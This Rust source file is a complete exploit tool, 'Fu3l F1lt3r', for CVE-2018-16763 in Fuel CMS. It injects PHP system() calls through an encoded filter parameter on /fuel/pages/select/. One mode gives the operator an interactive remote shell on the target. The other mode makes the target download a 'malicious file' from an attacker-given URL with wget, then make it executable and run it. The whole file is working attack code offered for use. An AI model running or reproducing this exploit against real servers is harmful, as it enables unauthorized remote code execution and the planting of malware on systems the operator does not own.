use std::env;
use std::process::exit;

use clap::crate_version;
use colored::*;
use text_io::read;
use urlencoding::encode;

use crate::cool_text::load_title;

mod color_macro;
mod cool_text;

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();

    println!("{}\n", load_title());
    println!("        You're using Fu3l F1lt3r {} which abuses CVE 2018-16763 ;D\n\n", &crate_version!());

    match args.len() {
        1 => {
            error_out!("Please add a target to attack!");
            regular_out!("Syntax: fu3lf1lt3r <target> [file url]");
            regular_out!("Adding a file url will launch a malicious file attack.");
            exit(1);
        }
        2 => {
            regular_out!(format!("Attacking {}!", args[1]));

            // Check if we get a response from GETing the target
            warning_out!("Checking if target is vaild...");
            if reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], "ls")).await.unwrap().status() == 200 {
                okay_out!("Target vulnerable... Continuing with attack...")
            } else {
                error_out!("Target not vulnerable! Stopping attack!");
                exit(1);
            }

            okay_out!("Basic shell open!");
            loop {
                let input: String = read!("{}\n");
                println!("{}", find_output(args[1].clone(), input).await);
            }
        }
        3 => {
            regular_out!("Selecting malicious file attack...");
            regular_out!(format!("Setting {} as malicious file address...", args[2]));
            regular_out!(format!("Attacking {}!", args[1]));

            // Check if we get a response from GETing the target
            warning_out!("Checking if target is vaild...");
            if reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], "ls")).await.unwrap().status() == 200 {
                okay_out!("Target vulnerable... Continuing with attack...")
            } else {
                error_out!("Target not vulnerable! Stopping attack!");
                exit(1);
            }

            regular_out!(format!("Downloading malicious file..."));
            reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"rm malfile"##))).await.ok();
            let resp_down = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(&format!(r##"wget -O malfile {}"##, args[2])))).await;
            if resp_down.unwrap().status() == 200 {
                okay_out!("Malicious file downloaded!");
            } else {
                error_out!("Malicious file failed to download!");
                exit(1);
            }

            regular_out!(format!("Running malicious file..."));
            reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"chmod +x malfile"##))).await.ok();
            let resp_run = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"./malfile"##))).await;
            if resp_run.unwrap().status() == 200 {
                okay_out!("Malicious file ran and closed!");
                exit(0);
            } else {
                error_out!("Malicious file failed to run!");
                exit(1);
            }
        }
        _ => {
            error_out!("Too many arguments!");
            regular_out!("Syntax: fu3lf1lt3r <target> [file url]");
            regular_out!("Adding a file url will launch a malicious file attack.");
            exit(1);
        }
    }
}

async fn find_output(ip: String, command: String) -> String {
    let resp = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", ip, encode(&command))).await;

    let mut output_text = String::new();

    for i in resp.unwrap().text().await.unwrap().lines() {
        if i == r##"<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">"## {
            break;
        }
        output_text.push_str(&format!("{}\n", i))
    }

    return output_text.trim_start_matches("system").to_string();
}
